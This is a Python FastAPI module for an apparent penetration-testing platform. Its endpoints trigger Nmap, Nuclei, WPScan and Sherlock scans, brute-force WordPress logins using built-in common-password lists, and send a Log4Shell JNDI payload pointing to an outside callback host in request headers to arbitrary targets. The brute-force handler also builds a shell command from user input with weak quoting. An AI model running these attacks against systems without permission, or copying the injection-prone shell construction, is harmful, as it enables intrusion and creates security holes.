"""
Scan Engine API — trigger scans, stream progress, get findings
"""
import uuid
import asyncio
from typing import Optional, List
from datetime import datetime, timezone
from fastapi import APIRouter, Depends, HTTPException, Query
from fastapi.responses import StreamingResponse
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select, func, desc
from pydantic import BaseModel
import json

from app.db.session import get_db
from app.db.models import ScanJob, ScanFinding, User
from app.api.deps import get_current_user

router = APIRouter()

VALID_MODULES = ["port_scan", "web_scan", "ssl_tls", "headers", "subdomain", "dns", "cve_match"]

MODULE_META = {
    "port_scan":  {"label": "Port Scan",         "icon": "Cpu",      "desc": "Nmap port + service fingerprinting", "timeout": 180},
    "web_scan":   {"label": "Web Scan",           "icon": "Globe",    "desc": "Nuclei template-based vulnerability scan", "timeout": 300},
    "ssl_tls":    {"label": "SSL/TLS",            "icon": "Shield",   "desc": "SSL/TLS misconfiguration check", "timeout": 120},
    "headers":    {"label": "Security Headers",   "icon": "Lock",     "desc": "HTTP security headers analysis", "timeout": 30},
    "subdomain":  {"label": "Subdomain Recon",    "icon": "Search",   "desc": "Passive subdomain discovery", "timeout": 120},
    "dns":        {"label": "DNS Check",          "icon": "Server",   "desc": "DNS misconfiguration & SPF/DMARC/DNSSEC", "timeout": 60},
    "cve_match":  {"label": "CVE Match",          "icon": "AlertTriangle", "desc": "Match services to CVE database", "timeout": 30},
}


class ScanEngineRequest(BaseModel):
    target: str
    modules: List[str] = ["port_scan", "headers", "ssl_tls", "dns"]
    options: dict = {}
    scan_name: Optional[str] = None
    target_id: Optional[str] = None


class NVDIngestRequest(BaseModel):
    years: Optional[List[int]] = None


def finding_to_dict(f: ScanFinding) -> dict:
    return {
        "id": f.id, "scan_job_id": f.scan_job_id,
        "target_value": f.target_value, "module": f.module,
        "severity": f.severity, "title": f.title,
        "description": f.description, "evidence": f.evidence,
        "host": f.host, "port": f.port, "protocol": f.protocol,
        "service": f.service, "cve_ids": f.cve_ids or [],
        "cvss_score": f.cvss_score, "cpe": f.cpe,
        "remediation": f.remediation, "owasp_category": f.owasp_category,
        "false_positive": f.false_positive,
        "created_at": f.created_at.isoformat() if f.created_at else None,
    }


@router.get("/modules")
async def list_modules():
    """List available scan modules"""
    return [{"id": k, **v} for k, v in MODULE_META.items()]


@router.post("/run", status_code=201)
async def run_scan(
    data: ScanEngineRequest,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """Launch a modular scan"""
    # Validate modules
    invalid = [m for m in data.modules if m not in VALID_MODULES]
    if invalid:
        raise HTTPException(400, detail=f"Invalid modules: {invalid}")

    if not data.target.strip():
        raise HTTPException(400, detail="Target is required")

    # Create ScanJob
    job_id = str(uuid.uuid4())
    job = ScanJob(
        id=job_id,
        target_value=data.target.strip(),
        target=data.target.strip(),
        target_id=data.target_id,
        scan_mode="custom",
        status="queued",
        progress=0,
        tools=data.modules,
        modules=data.modules,
        parameters=data.options,
        options=data.options or {},
        result_summary={},
        created_by=current_user.id,
    )
    db.add(job)
    await db.commit()

    # Launch Celery task
    from app.tasks.scan_engine_tasks import run_full_scan
    run_full_scan.apply_async(
        args=[job_id, data.target.strip(), data.modules, data.options],
        queue="scan_queue",
    )

    return {
        "job_id": job_id,
        "target": data.target,
        "modules": data.modules,
        "status": "queued",
    }


@router.get("/status/{job_id}")
async def get_scan_status(
    job_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(ScanJob).where(ScanJob.id == job_id))
    job = result.scalar_one_or_none()
    if not job:
        raise HTTPException(404, detail="Job not found")

    # Count findings
    count_q = select(func.count()).where(ScanFinding.scan_job_id == job_id)
    finding_count = (await db.execute(count_q)).scalar()

    return {
        "job_id": job.id,
        "target": job.target_value,
        "status": job.status,
        "progress": job.progress,
        "modules": job.tools or [],
        "finding_count": finding_count,
        "result_summary": job.result_summary,
        "created_at": job.created_at.isoformat() if job.created_at else None,
        "started_at": job.started_at.isoformat() if job.started_at else None,
        "finished_at": job.finished_at.isoformat() if job.finished_at else None,
    }


@router.get("/stream/{job_id}")
async def stream_scan_status(
    job_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """SSE stream for real-time scan progress"""
    async def event_generator():
        seen_finding_ids = set()
        stale_count = 0

        while True:
            try:
                result = await db.execute(select(ScanJob).where(ScanJob.id == job_id))
                job = result.scalar_one_or_none()
                if not job:
                    yield f"data: {json.dumps({'type': 'error', 'message': 'Job not found'})}\n\n"
                    break

                # New findings since last check
                findings_q = select(ScanFinding).where(
                    ScanFinding.scan_job_id == job_id
                ).order_by(ScanFinding.created_at)
                findings_result = await db.execute(findings_q)
                findings = findings_result.scalars().all()

                for f in findings:
                    if f.id not in seen_finding_ids:
                        seen_finding_ids.add(f.id)
                        yield f"data: {json.dumps({'type': 'finding', 'finding': finding_to_dict(f)})}\n\n"

                # Progress update
                yield f"data: {json.dumps({'type': 'progress', 'progress': job.progress, 'status': job.status, 'finding_count': len(seen_finding_ids)})}\n\n"

                if job.status in ("completed", "failed", "cancelled"):
                    yield f"data: {json.dumps({'type': 'done', 'status': job.status, 'summary': job.result_summary, 'finding_count': len(seen_finding_ids)})}\n\n"
                    break

                await asyncio.sleep(2)
                stale_count += 1
                if stale_count > 900:  # 30 min max
                    break

            except Exception as e:
                yield f"data: {json.dumps({'type': 'error', 'message': str(e)})}\n\n"
                break

    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"},
    )


@router.get("/findings/{job_id}")
async def get_findings(
    job_id: str,
    severity: Optional[str] = Query(None),
    module: Optional[str] = Query(None),
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    query = select(ScanFinding).where(ScanFinding.scan_job_id == job_id)
    if severity:
        query = query.where(ScanFinding.severity == severity)
    if module:
        query = query.where(ScanFinding.module == module)
    query = query.order_by(
        desc(ScanFinding.severity),
        ScanFinding.module
    )
    result = await db.execute(query)
    findings = result.scalars().all()
    return {"job_id": job_id, "count": len(findings), "findings": [finding_to_dict(f) for f in findings]}


@router.get("/history")
async def scan_history(
    limit: int = Query(20, le=100),
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    """Recent scan engine jobs"""
    query = (
        select(ScanJob)
        .where(ScanJob.tools.isnot(None))
        .order_by(desc(ScanJob.created_at))
        .limit(limit)
    )
    result = await db.execute(query)
    jobs = result.scalars().all()
    out = []
    for job in jobs:
        count_q = select(func.count()).where(ScanFinding.scan_job_id == job.id)
        count = (await db.execute(count_q)).scalar()
        out.append({
            "job_id": job.id, "target": job.target_value,
            "status": job.status, "progress": job.progress,
            "modules": job.tools or [], "finding_count": count,
            "result_summary": job.result_summary,
            "created_at": job.created_at.isoformat() if job.created_at else None,
            "finished_at": job.finished_at.isoformat() if job.finished_at else None,
        })
    return out


@router.post("/nvd/ingest")
async def trigger_nvd_ingest(
    data: NVDIngestRequest,
    current_user: User = Depends(get_current_user),
):
    """Trigger NVD feed ingestion (admin only)"""
    if current_user.role != "admin":
        raise HTTPException(403, detail="Admin only")
    from app.tasks.scan_engine_tasks import ingest_nvd_feed
    task = ingest_nvd_feed.apply_async(
        args=[data.years],
        queue="scan_queue",
    )
    return {"task_id": task.id, "years": data.years, "status": "queued"}


@router.get("/nvd/stats")
async def nvd_stats(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    from app.db.models import CVECache, NVDIngestionLog
    total = (await db.execute(select(func.count(CVECache.id)))).scalar()
    kev_count = (await db.execute(select(func.count(CVECache.id)).where(CVECache.is_kev == True))).scalar()
    critical = (await db.execute(select(func.count(CVECache.id)).where(CVECache.severity == "critical"))).scalar()
    logs_q = select(NVDIngestionLog).order_by(desc(NVDIngestionLog.created_at)).limit(5)
    logs = (await db.execute(logs_q)).scalars().all()
    return {
        "total_cves": total,
        "kev_count": kev_count,
        "critical_count": critical,
        "recent_ingestions": [
            {"year": l.feed_year, "status": l.status, "count": l.cve_count,
             "created_at": l.created_at.isoformat() if l.created_at else None}
            for l in logs
        ]
    }


@router.patch("/findings/{finding_id}/fp")
async def toggle_false_positive(
    finding_id: str,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(ScanFinding).where(ScanFinding.id == finding_id))
    finding = result.scalar_one_or_none()
    if not finding:
        raise HTTPException(404, detail="Finding not found")
    finding.false_positive = not finding.false_positive
    await db.commit()
    return {"id": finding_id, "false_positive": finding.false_positive}


@router.get("/nuclei/templates")
async def list_nuclei_templates(
    current_user: User = Depends(get_current_user),
):
    """List available nuclei template categories and subcategories"""
    import os
    # Try multiple paths
    for base in ["/app/nuclei-templates", "/home/appuser/nuclei-templates",
                 "/root/nuclei-templates"]:
        if os.path.isdir(base):
            template_base = base
            break
    else:
        return {"error": "nuclei templates not found"}

    result = {}
    for category in sorted(os.listdir(template_base)):
        cat_path = os.path.join(template_base, category)
        if not os.path.isdir(cat_path):
            continue
        # Skip non-template dirs
        if category in ('helpers', 'workflows', 'profiles', 'config'):
            continue
        subcats = []
        yaml_count = 0
        for item in sorted(os.listdir(cat_path)):
            item_path = os.path.join(cat_path, item)
            if os.path.isdir(item_path):
                count = len([f for f in os.listdir(item_path) if f.endswith('.yaml')])
                if count > 0:
                    subcats.append({"name": item, "count": count,
                                    "path": f"{category}/{item}"})
                    yaml_count += count
            elif item.endswith('.yaml'):
                yaml_count += 1
        if yaml_count > 0 or subcats:
            result[category] = {
                "subcategories": subcats,
                "total": yaml_count,
            }
    return result


# ── WPScan ────────────────────────────────────────────────────
from pydantic import BaseModel as _BaseModel

class WPScanRequest(_BaseModel):
    target: str
    api_token: str = ""
    enumerate: str = "vp,vt,tt,cb,dbe,u,m"
    options: dict = {}

@router.post("/wpscan/run")
async def run_wpscan(
    data: WPScanRequest,
    current_user: User = Depends(get_current_user),
):
    import asyncio, httpx

    target = data.target.strip()
    if not target.startswith("http"):
        target = f"http://{target}"

    # Step 1: detect WordPress
    async with httpx.AsyncClient(timeout=15, follow_redirects=True) as client:
        try:
            resp = await client.get(target)
            html = resp.text.lower()
            headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
            is_wp = any([
                "wp-content" in html,
                "wp-includes" in html,
                "wordpress" in html,
                "wordpress" in headers.get("x-powered-by", ""),
                "/wp-login.php" in html,
            ])
        except Exception as e:
            return {"is_wordpress": False, "error": str(e), "findings": []}

    if not is_wp:
        return {"is_wordpress": False, "findings": [], "summary": "Not a WordPress site"}

    # Step 2: run wpscan via subprocess (host binary or Docker)
    import shutil, asyncio as aio

    cmd = None
    # Run wpscan via Docker socket (httpx)
    import json as _json

    opts = data.options or {}
    base_args = ["--url", target, "--format", "json", "--no-update"]

    if opts.get("randomUserAgent", True):
        base_args += ["--random-user-agent"]
    if opts.get("disableTls", True):
        base_args += ["--disable-tls-checks"]
    if opts.get("stealthy"):
        base_args += ["--stealthy"]
    if opts.get("forcePassiveDetection"):
        base_args += ["--detection-mode", "passive"]
    if opts.get("httpAuth"):
        base_args += ["--http-auth", opts["httpAuth"]]
    if opts.get("proxy"):
        base_args += ["--proxy", opts["proxy"]]
    if opts.get("wpContentDir"):
        base_args += ["--wp-content-dir", opts["wpContentDir"]]
    if data.api_token:
        base_args += ["--api-token", data.api_token]
    if data.enumerate:
        base_args += ["--enumerate", data.enumerate]

    import logging as _logging
    _logger = _logging.getLogger("wpscan")
    _logger.info(f"WPScan cmd args: {' '.join(base_args)}")

    cmd = base_args  # will be used as docker container cmd

    # Set timeout based on enumerate mode
    _enum = data.enumerate or ""
    if "ap" in _enum and "at" in _enum:
        _timeout = 900   # full: 15 min
    elif "ap" in _enum or "at" in _enum:
        _timeout = 600   # all plugins or themes: 10 min
    else:
        _timeout = 300   # standard: 5 min

    try:
        import httpx as _httpx
        transport = _httpx.AsyncHTTPTransport(uds="/var/run/docker.sock")
        async with _httpx.AsyncClient(transport=transport, base_url="http://docker") as docker:
            # Create container
            create_resp = await docker.post("/containers/create", json={
                "Image": "wpscanteam/wpscan",
                "Cmd": cmd,
                "NetworkingConfig": {"EndpointsConfig": {"bridge": {}}},
                "HostConfig": {"NetworkMode": "bridge", "AutoRemove": False},
            })
            if create_resp.status_code not in (200, 201):
                return {"is_wordpress": True, "error": f"Docker create failed: {create_resp.text[:200]}", "findings": []}

            container_id = create_resp.json()["Id"]

            # Start
            await docker.post(f"/containers/{container_id}/start")

            # Wait (timeout 180s)
            wait_resp = await _httpx.AsyncClient(
                transport=_httpx.AsyncHTTPTransport(uds="/var/run/docker.sock"),
                base_url="http://docker",
                timeout=_timeout + 30,
            ).post(f"/containers/{container_id}/wait")

            # Logs
            log_resp = await docker.get(
                f"/containers/{container_id}/logs",
                params={"stdout": True, "stderr": True}
            )
            raw = log_resp.content
            # Parse docker log format (8-byte header per chunk)
            stdout_parts = []
            i = 0
            while i + 8 <= len(raw):
                stream_type = raw[i]
                length = int.from_bytes(raw[i+4:i+8], "big")
                chunk = raw[i+8:i+8+length].decode("utf-8", errors="replace")
                if stream_type in (1, 2):
                    stdout_parts.append(chunk)
                i += 8 + length
            stdout = "".join(stdout_parts)
            stderr = ""

            # Cleanup
            await docker.delete(f"/containers/{container_id}", params={"force": True})

    except aio.TimeoutError:
        return {"is_wordpress": True, "error": f"WPScan timeout ({_timeout}s) — try a faster scan mode", "findings": []}
    except Exception as e:
        return {"is_wordpress": True, "error": str(e), "findings": []}

    # Parse JSON output
    findings = []
    try:
        # wpscan JSON can have prefix text, find first {
        idx = stdout.find("{")
        if idx >= 0:
            result = __import__("json").loads(stdout[idx:])
        else:
            raise ValueError("No JSON found")

        wp_version = result.get("version", {})
        if wp_version:
            v = wp_version.get("number", "unknown")
            vulns = wp_version.get("vulnerabilities", [])
            sev = "high" if vulns else "info"
            findings.append({
                "type": "wordpress_version",
                "severity": sev,
                "title": f"WordPress {v}",
                "detail": f"{len(vulns)} known vulnerabilities" if vulns else "No known vulnerabilities",
                "vulnerabilities": [{"title": vv.get("title"), "cvss": vv.get("cvss")} for vv in vulns[:5]],
            })

        # Plugins
        for slug, plugin in result.get("plugins", {}).items():
            vulns = plugin.get("vulnerabilities", [])
            ver = plugin.get("version", {}).get("number", "?")
            sev = "critical" if any(v.get("cvss", {}).get("score", 0) >= 9 for v in vulns) else \
                  "high" if vulns else "info"
            findings.append({
                "type": "plugin",
                "severity": sev,
                "title": f"Plugin: {slug} v{ver}",
                "detail": f"{len(vulns)} vulnerabilities" if vulns else "No known vulnerabilities",
                "vulnerabilities": [{"title": vv.get("title"), "cvss": vv.get("cvss")} for vv in vulns[:3]],
            })

        # Themes
        for slug, theme in result.get("themes", {}).items():
            vulns = theme.get("vulnerabilities", [])
            ver = theme.get("version", {}).get("number", "?")
            if vulns:
                findings.append({
                    "type": "theme",
                    "severity": "high",
                    "title": f"Theme: {slug} v{ver}",
                    "detail": f"{len(vulns)} vulnerabilities",
                    "vulnerabilities": [{"title": vv.get("title")} for vv in vulns[:3]],
                })

        # Users
        users = result.get("users", {})
        if users:
            findings.append({
                "type": "users",
                "severity": "medium",
                "title": f"Enumerated {len(users)} WordPress users",
                "detail": ", ".join(list(users.keys())[:5]),
                "vulnerabilities": [],
            })

        # Interesting findings
        for item in result.get("interesting_findings", []):
            findings.append({
                "type": "interesting",
                "severity": "low",
                "title": item.get("to_s", item.get("type", "Interesting finding")),
                "detail": item.get("url", ""),
                "vulnerabilities": [],
            })

    except Exception as e:
        findings.append({
            "type": "error",
            "severity": "info",
            "title": "WPScan completed (raw output)",
            "detail": stdout[:500] if stdout else stderr[:500],
            "vulnerabilities": [],
        })

    summary = {
        "critical": sum(1 for f in findings if f["severity"] == "critical"),
        "high":     sum(1 for f in findings if f["severity"] == "high"),
        "medium":   sum(1 for f in findings if f["severity"] == "medium"),
        "low":      sum(1 for f in findings if f["severity"] == "low"),
        "info":     sum(1 for f in findings if f["severity"] == "info"),
    }

    return {
        "is_wordpress": True,
        "target": target,
        "findings": findings,
        "summary": summary,
        "raw_available": len(stdout) > 0,
    }


# ── WPScan Bruteforce ─────────────────────────────────────────
class WPBruteRequest(_BaseModel):
    target: str
    usernames: list[str] = []
    passwords: list[str] = []
    wordlist_type: str = "custom"  # custom | rockyou_mini | common
    threads: int = 5
    api_token: str = ""

COMMON_PASSWORDS = [
    "123456","password","admin","admin123","12345678","qwerty","abc123",
    "111111","123123","admin@123","letmein","welcome","monkey","dragon",
    "master","login","pass","test","root","toor","wordpress","wp_admin",
    "changeme","secret","1234","pass123","admin1","admin2024","admin2025",
    "password1","p@ssw0rd","P@ssw0rd","Password1","Admin123","admin!",
]

ROCKYOU_MINI = COMMON_PASSWORDS + [
    "sunshine","princess","shadow","superman","michael","jessica",
    "696969","baseball","football","iloveyou","trustno1","batman",
    "thomas","robert","tiger","hello","charlie","donald","daniel",
]

@router.post("/wpscan/bruteforce")
async def wp_bruteforce(
    data: WPBruteRequest,
    current_user: User = Depends(get_current_user),
):
    import asyncio as aio, httpx as _httpx, json as _json

    target = data.target.strip()
    if not target.startswith("http"):
        target = f"http://{target}"

    # Resolve password list
    if data.wordlist_type == "common":
        passwords = COMMON_PASSWORDS
    elif data.wordlist_type == "rockyou_mini":
        passwords = ROCKYOU_MINI
    else:
        passwords = data.passwords

    if not data.usernames:
        return {"error": "No usernames provided", "results": []}
    if not passwords:
        return {"error": "No passwords provided", "results": []}

    # Build wpscan cmd
    usernames_str = ",".join(data.usernames)
    passwords_str = "\n".join(passwords)

    # Write passwords to temp file inside container via env
    cmd = [
        "--url", target,
        "--format", "json",
        "--no-update",
        "--random-user-agent",
        "--disable-tls-checks",
        "--passwords", "/tmp/wp_pass.txt",
        "--usernames", usernames_str,
        "--max-threads", str(min(data.threads, 10)),
    ]
    if data.api_token:
        cmd += ["--api-token", data.api_token]

    try:
        transport = _httpx.AsyncHTTPTransport(uds="/var/run/docker.sock")
        async with _httpx.AsyncClient(transport=transport, base_url="http://docker") as docker:
            # Create container with password list as env + entrypoint to write file first
            create_resp = await docker.post("/containers/create", json={
                "Image": "wpscanteam/wpscan",
                "Cmd": cmd,
                "NetworkingConfig": {"EndpointsConfig": {"bridge": {}}},
                "HostConfig": {
                    "NetworkMode": "bridge",
                    "AutoRemove": False,
                    # Write passwords via bind mount workaround
                },
                "Env": [f"WP_PASSWORDS={passwords_str}"],
            })

            # Actually use a shell entrypoint to write passwords first
            create_resp2 = await docker.post("/containers/create", json={
                "Image": "wpscanteam/wpscan",
                "Entrypoint": ["/bin/sh", "-c"],
                "Cmd": [
                    f"printf '%s' \"$WP_PASSWORDS\" > /tmp/wp_pass.txt && wpscan " +
                    " ".join(f'"{a}"' if " " in a else a for a in cmd)
                ],
                "NetworkingConfig": {"EndpointsConfig": {"bridge": {}}},
                "HostConfig": {"NetworkMode": "bridge", "AutoRemove": False},
                "Env": [f"WP_PASSWORDS={passwords_str}"],
            })

            # Clean up first container
            cid1 = create_resp.json().get("Id")
            if cid1:
                await docker.delete(f"/containers/{cid1}", params={"force": True})

            if create_resp2.status_code not in (200, 201):
                return {"error": f"Docker error: {create_resp2.text[:200]}", "results": []}

            container_id = create_resp2.json()["Id"]
            await docker.post(f"/containers/{container_id}/start")

            # Wait max 10 min
            wait_resp = await _httpx.AsyncClient(
                transport=_httpx.AsyncHTTPTransport(uds="/var/run/docker.sock"),
                base_url="http://docker", timeout=620,
            ).post(f"/containers/{container_id}/wait")

            # Get logs
            log_resp = await docker.get(
                f"/containers/{container_id}/logs",
                params={"stdout": True, "stderr": True}
            )
            raw = log_resp.content
            stdout_parts = []
            i = 0
            while i + 8 <= len(raw):
                stream_type = raw[i]
                length = int.from_bytes(raw[i+4:i+8], "big")
                chunk = raw[i+8:i+8+length].decode("utf-8", errors="replace")
                if stream_type in (1, 2):
                    stdout_parts.append(chunk)
                i += 8 + length
            stdout = "".join(stdout_parts)

            await docker.delete(f"/containers/{container_id}", params={"force": True})

    except aio.TimeoutError:
        return {"error": "Bruteforce timeout (10 min)", "results": []}
    except Exception as e:
        return {"error": str(e), "results": []}

    # Parse results
    results = []
    try:
        idx = stdout.find("{")
        if idx >= 0:
            result = _json.loads(stdout[idx:])
            for user, info in result.get("passwords", {}).items():
                if info.get("found"):
                    results.append({
                        "username": user,
                        "password": info.get("password", ""),
                        "found": True,
                    })
    except Exception:
        # Try regex fallback
        import re
        for m in re.finditer(r"Password Found: (.+?) for username (.+)", stdout):
            results.append({"username": m.group(2).strip(), "password": m.group(1).strip(), "found": True})

    return {
        "target": target,
        "usernames_tested": data.usernames,
        "passwords_tested": len(passwords),
        "results": results,
        "found": len(results),
        "raw": stdout[:1000] if not results else "",
    }


# ── Log4Shell Scanner ─────────────────────────────────────────
class Log4ShellRequest(_BaseModel):
    targets: list[str]
    mode: str = "detect"  # detect | exploit
    custom_callback: str = ""  # optional custom OAST url
    headers_to_test: list[str] = []

LOG4J_TEMPLATES_DIR = "/app/nuclei-templates"

LOG4J_TEMPLATE_PATHS = [
    "http/vulnerabilities/apache/log4j",
    "http/vulnerabilities/other/unifi-network-log4j-rce.yaml",
    "http/vulnerabilities/other/elasticsearch5-log4j-rce.yaml",
    "http/vulnerabilities/vmware/vmware-vcenter-log4j-jndi-rce.yaml",
    "http/vulnerabilities/vmware/vmware-horizon-log4j-jndi-rce.yaml",
    "http/vulnerabilities/springboot/springboot-log4j-rce.yaml",
]

DEFAULT_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Api-Version",
    "X-Forwarded-Host",
    "Referer",
    "X-Client-IP",
    "CF-Connecting-IP",
    "True-Client-IP",
    "X-Real-IP",
    "Forwarded",
]

@router.post("/log4shell/scan")
async def log4shell_scan(
    data: Log4ShellRequest,
    current_user: User = Depends(get_current_user),
):
    import asyncio as aio, json as _json, uuid as _uuid

    if not data.targets:
        return {"error": "No targets provided", "results": []}

    results = []
    scan_id = str(_uuid.uuid4())[:8]

    for target in data.targets[:20]:  # max 20 targets
        target = target.strip()
        if not target:
            continue
        if not target.startswith("http"):
            target = f"http://{target}"

        target_result = {
            "target": target,
            "vulnerable": False,
            "findings": [],
            "headers_tested": DEFAULT_HEADERS,
            "status": "scanning",
        }

        # Build nuclei command with all log4j templates
        template_dir = LOG4J_TEMPLATES_DIR
        cmd = [
            "/usr/local/bin/nuclei",
            "-u", target,
            "-jsonl",
            "-no-color",
            "-timeout", "20",
            "-disable-update-check",
            "-silent",
            "-rate-limit", "10",
            "-bulk-size", "5",
            "-concurrency", "5",
        ]

        # Add interactsh for OOB detection
        if data.custom_callback:
            cmd += ["-interactsh-url", data.custom_callback]
        # Don't force oast.pro — let nuclei use its default

        # Add all log4j templates
        import os as _os
        log4j_dirs = [
            f"{template_dir}/http/vulnerabilities/apache/log4j",
            f"{template_dir}/http/vulnerabilities/springboot/springboot-log4j-rce.yaml",
            f"{template_dir}/http/vulnerabilities/other/unifi-network-log4j-rce.yaml",
            f"{template_dir}/http/vulnerabilities/other/elasticsearch5-log4j-rce.yaml",
            f"{template_dir}/http/vulnerabilities/vmware/vmware-vcenter-log4j-jndi-rce.yaml",
            f"{template_dir}/http/vulnerabilities/vmware/vmware-horizon-log4j-jndi-rce.yaml",
            f"{template_dir}/http/vulnerabilities/vmware/vmware-nsx-log4j-rce.yaml",
            f"{template_dir}/http/vulnerabilities/other/springboot-log4j-rce.yaml",
        ]
        for t in log4j_dirs:
            if _os.path.exists(t):
                cmd += ["-t", t]

        # Also do manual header injection test
        headers_tested = data.headers_to_test or DEFAULT_HEADERS

        try:
            proc = await aio.create_subprocess_exec(
                *cmd,
                stdout=aio.subprocess.PIPE,
                stderr=aio.subprocess.PIPE,
            )
            stdout_b, stderr_b = await aio.wait_for(proc.communicate(), timeout=120)
            stdout = stdout_b.decode("utf-8", errors="replace")
            stderr = stderr_b.decode("utf-8", errors="replace")

            # Parse nuclei findings
            for line in stdout.splitlines():
                line = line.strip()
                if not line:
                    continue
                try:
                    item = _json.loads(line)
                    info = item.get("info", {})
                    name = info.get("name", "")
                    sev  = info.get("severity", "info")
                    matched = item.get("matched-at", item.get("matched", target))
                    template_id = item.get("template-id", "")

                    finding = {
                        "title": name,
                        "severity": sev,
                        "matched": matched,
                        "template": template_id,
                        "type": "nuclei",
                        "cve": info.get("classification", {}).get("cve-id", [""])[0] if info.get("classification", {}).get("cve-id") else "",
                    }
                    target_result["findings"].append(finding)
                    if sev in ("critical", "high"):
                        target_result["vulnerable"] = True
                except Exception:
                    continue

        except aio.TimeoutError:
            target_result["status"] = "timeout"
        except Exception as e:
            target_result["status"] = f"error: {str(e)}"
            continue

        # Manual JNDI header injection test
        if data.mode in ("detect", "exploit"):
            import httpx as _httpx
            callback = data.custom_callback or "oast.pro"
            jndi_payload = f"${{jndi:ldap://{callback}/log4shell-{scan_id}}}"

            try:
                async with _httpx.AsyncClient(
                    timeout=10,
                    verify=False,
                    follow_redirects=True,
                ) as client:
                    for header in headers_tested[:10]:
                        try:
                            resp = await client.get(
                                target,
                                headers={
                                    header: jndi_payload,
                                    "User-Agent": f"Mozilla/5.0 {jndi_payload}" if header != "User-Agent" else jndi_payload,
                                }
                            )
                            # Check response for error indicators
                            if any(x in resp.text.lower() for x in [
                                "javax.naming", "ldap", "jndi", "log4j",
                                "namingexception", "communicationexception"
                            ]):
                                target_result["findings"].append({
                                    "title": f"Possible Log4Shell via {header}",
                                    "severity": "high",
                                    "matched": target,
                                    "template": "manual-header-injection",
                                    "type": "manual",
                                    "header": header,
                                    "cve": "CVE-2021-44228",
                                    "payload": jndi_payload,
                                })
                                target_result["vulnerable"] = True
                        except Exception:
                            continue
            except Exception:
                pass

        target_result["status"] = "completed"
        target_result["payload_used"] = f"${{jndi:ldap://{data.custom_callback or 'oast.pro'}/log4shell-{scan_id}}}"
        target_result["headers_tested"] = headers_tested[:10]
        results.append(target_result)

    summary = {
        "total": len(results),
        "vulnerable": sum(1 for r in results if r["vulnerable"]),
        "not_vulnerable": sum(1 for r in results if not r["vulnerable"] and r["status"] == "completed"),
        "errors": sum(1 for r in results if "error" in r.get("status", "")),
    }

    return {
        "scan_id": scan_id,
        "results": results,
        "summary": summary,
    }


# ── Sherlock OSINT ────────────────────────────────────────────
from pydantic import BaseModel as _BM2

class SherlockRequest(_BM2):
    usernames: list[str]
    timeout: int = 30
    nsfw: bool = False
    sites: list[str] = []

@router.post("/sherlock/scan")
async def sherlock_scan(
    data: SherlockRequest,
    current_user: User = Depends(get_current_user),
):
    import asyncio as aio

    usernames = [u.strip() for u in data.usernames[:5] if u.strip()]
    if not usernames:
        return {"error": "No usernames", "results": {}, "total_found": 0}

    cmd = [
        "python3", "-m", "sherlock_project",
        "--timeout", str(min(data.timeout, 60)),
        "--print-found",
        "--no-color",
    ]
    if data.nsfw:
        cmd += ["--nsfw"]
    for site in data.sites[:20]:
        cmd += ["--site", site]
    cmd += usernames

    try:
        proc = await aio.create_subprocess_exec(
            *cmd,
            stdout=aio.subprocess.PIPE,
            stderr=aio.subprocess.PIPE,
        )
        stdout_b, _ = await aio.wait_for(
            proc.communicate(),
            timeout=data.timeout * len(usernames) + 60
        )
        stdout = stdout_b.decode("utf-8", errors="replace")
    except aio.TimeoutError:
        return {"error": "Sherlock timeout", "results": {}, "total_found": 0}
    except Exception as e:
        return {"error": str(e), "results": {}, "total_found": 0}

    # Parse output
    results = {}
    current_username = None

    for line in stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        if "[*] Checking username" in line:
            for u in usernames:
                if u in line:
                    current_username = u
                    results[u] = []
                    break
        elif line.startswith("[+]") and current_username is not None:
            parts = line[3:].strip().split(": ", 1)
            if len(parts) == 2:
                site_name = parts[0].strip()
                url = parts[1].strip()
                results[current_username].append({
                    "site": site_name,
                    "url": url,
                    "category": _cat_site(site_name),
                })

    summary = {
        u: {
            "total": len(v),
            "categories": {c: sum(1 for f in v if f["category"]==c)
                          for c in set(f["category"] for f in v)}
        } for u, v in results.items()
    }

    return {
        "usernames": usernames,
        "results": results,
        "summary": summary,
        "total_found": sum(len(v) for v in results.values()),
    }

def _cat_site(name: str) -> str:
    n = name.lower().replace(" ", "").replace(".", "").replace("-", "")
    if any(s in n for s in ["twitter","instagram","facebook","tiktok","snapchat","linkedin","reddit","mastodon","bluesky","threads","tumblr","pinterest","x(twitter)","vk","weibo","mewe","parler","gab","minds","diaspora","plurk","ello","peach","livejournal","xing","academia","allmylinks","about","7cups","allmy"]): return "social"
    if any(s in n for s in ["github","gitlab","bitbucket","stackoverflow","hackerone","bugcrowd","tryhackme","hackthebox","replit","leetcode","hackerrank","codeforces","codepen","kaggle","dockerhub","npmjs","pypi","rubygems","packagist","vjudge","topcoder","spoj","codechef"]): return "dev/security"
    if any(s in n for s in ["steam","twitch","xbox","roblox","minecraft","chess","lichess","1337x","epicgames","riot","battlenet","playstation","itch","kongregate","newgrounds","gamejolt","boardgame","speedrun","aternos","namemc","hypixel"]): return "gaming"
    if any(s in n for s in ["spotify","soundcloud","bandcamp","lastfm","mixcloud","audiomack","audiojungle","reverbnation","musescore","songkick","genius","rateyourmusic","discogs","imeem","grooveshark","datpiff"]): return "music"
    if any(s in n for s in ["deviantart","behance","dribbble","artstation","flickr","vsco","500px","unsplash","redbubble","society6","pixiv","artfight","wattpad","ao3","fanfiction","furaffinity","newground","sketchfab","thingiverse"]): return "creative"
    if any(s in n for s in ["tinder","okcupid","badoo","bumble","grindr","pof","match","zoosk","hinge","tagged","meetme","mocospace"]): return "dating"
    if any(s in n for s in ["buymeacoffee","patreon","ko-fi","onlyfans","gofundme","indiegogo","kickstarter","producthunt","angellist","crunchbase"]): return "business"
